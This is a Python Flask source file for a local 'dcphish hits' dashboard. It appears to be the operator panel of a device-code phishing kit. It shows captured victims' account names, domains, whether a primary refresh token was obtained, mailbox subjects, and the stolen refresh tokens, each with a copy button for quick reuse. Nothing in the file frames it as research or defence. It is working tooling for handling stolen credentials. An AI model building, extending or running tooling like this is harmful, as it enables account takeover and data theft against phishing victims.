#!/usr/bin/env python3
"""Local triage dashboard on 127.0.0.1:8081."""

import html

from flask import Flask, jsonify, render_template_string

import db

app = Flask(__name__)

PAGE = """<!doctype html>
<html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="30">
<title>dcphish hits</title>
<style>
body{font:13px/1.4 system-ui,monospace;background:#14161a;color:#ddd;margin:20px}
table{border-collapse:collapse;width:100%}
th,td{border-bottom:1px solid #333;padding:6px;text-align:left;vertical-align:top}
th{color:#8ab4f8}
button{background:#2d333b;color:#ddd;border:1px solid #444;border-radius:4px;cursor:pointer;padding:2px 6px}
code{color:#9ad}
.rt{max-width:420px;overflow-wrap:anywhere}
</style></head><body>
<h2>Hits (newest first) — auto refresh 30s</h2>
<table>
<tr><th>when</th><th>domain</th><th>UPN</th><th>PRT</th><th>consumer</th><th>refresh token</th><th>subjects</th></tr>
{% for h in hits %}
<tr>
<td>{{ h.obtained_at }}</td><td>{{ h.domain }}</td><td>{{ h.upn }}</td>
<td>{{ 'yes' if h.prt_path else 'no' }}</td><td>{{ 'yes' if h.consumer else '' }}</td>
<td class="rt"><code id="rt{{ loop.index }}">{{ h.refresh_token }}</code>
<button onclick="copy('rt{{ loop.index }}')">copy</button></td>
<td>{{ h.subjects }}</td>
</tr>
{% endfor %}
</table>
<script>
function copy(id){const t=document.getElementById(id).innerText;
navigator.clipboard.writeText(t).then(()=>{const b=event.target;b.innerText='copied';setTimeout(()=>b.innerText='copy',1200)})}
</script>
</body></html>"""


@app.route("/")
def index():
    hits = []
    for h in db.recent_hits():
        h = dict(h)
        for k in ("domain", "upn", "subjects"):
            h[k] = html.escape(h.get(k) or "")
        hits.append(h)
    return render_template_string(PAGE, hits=hits)


@app.route("/health")
def health():
    return jsonify(db.counts())


if __name__ == "__main__":
    db.init_db()
    app.run(host="127.0.0.1", port=8081, debug=False)
